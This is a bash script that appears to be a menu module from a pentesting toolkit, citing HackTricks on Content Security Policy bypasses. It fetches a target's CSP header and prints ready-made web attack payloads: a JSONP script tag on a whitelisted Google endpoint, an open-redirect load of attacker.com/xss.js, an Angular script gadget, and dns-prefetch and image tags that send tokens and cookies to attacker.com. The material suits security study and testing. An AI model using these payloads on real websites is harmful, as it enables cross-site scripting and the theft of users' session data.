#!/bin/bash
# HackTricks Ref: content-security-policy-csp-bypass
# Module: CSP (Content Security Policy) Analysis & Bypass

echo -e "${C6}[WEB ATTACK: CSP_BYPASS]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass"
echo -e "--------------------------------------------------"

echo -e "${C4}Select CSP Bypass Strategy:${NC}"
echo "1) Analyze CSP Policy (Fetch & Parse)"
echo "2) JSONP Endpoint Bypass (The Google/Twitter trick)"
echo "3) Open Redirect to Bypass Host Whitelist"
echo "4) Script Gadgets (Angular/Knockout.js)"
echo "5) Exfiltration via DNS/Prefetch (Policy Leakage)"
echo "0) Exit"

read -p "Selection: " csp_opt

case $csp_opt in
    1)
        read -p "Enter Target URL: " target
        echo -e "\n${C2}[*] Fetching CSP Header:${NC}"
        curl -I -s "$target" | grep -Ei "Content-Security-Policy"
        echo -e "\n${C4}Check Policy with: https://csp-evaluator.withgoogle.com/${NC}"
        ;;
    2)
        echo -e "\n${C2}[*] JSONP Bypass:${NC}"
        echo "If the CSP allows a domain like 'google.com', find a JSONP endpoint:"
        echo "Payload: <script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)\"></script>"
        echo "This bypasses CSP because the source domain is whitelisted."
        ;;
    3)
        echo -e "\n${C2}[*] Open Redirect Bypass:${NC}"
        echo "If 'self' is allowed and there is an Open Redirect:"
        echo "Payload: <script src=\"/redirect?url=https://attacker.com/xss.js\"></script>"
        echo "The browser checks the initial path (/redirect) which is 'self', thus allowing it."
        ;;
    4)
        echo -e "\n${C2}[*] Script Gadgets:${NC}"
        echo "If CSP blocks inline scripts but allows 'unsafe-eval' or specific libraries:"
        echo " - Angular: <div ng-app>{{constructor.constructor('alert(1)')()}}</div>"
        echo "Look for 'gadgets' in the JS code that can execute strings as code."
        ;;
    5)
        echo -e "\n${C2}[*] Data Exfiltration when 'connect-src' is blocked:${NC}"
        echo "Try to leak data via tags that aren't always restricted by base policies:"
        echo " - DNS Prefetch: <link rel=\"dns-prefetch\" href=\"//token.attacker.com\">"
        echo " - Image: <img src=\"https://attacker.com/log?c=cookie\">"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
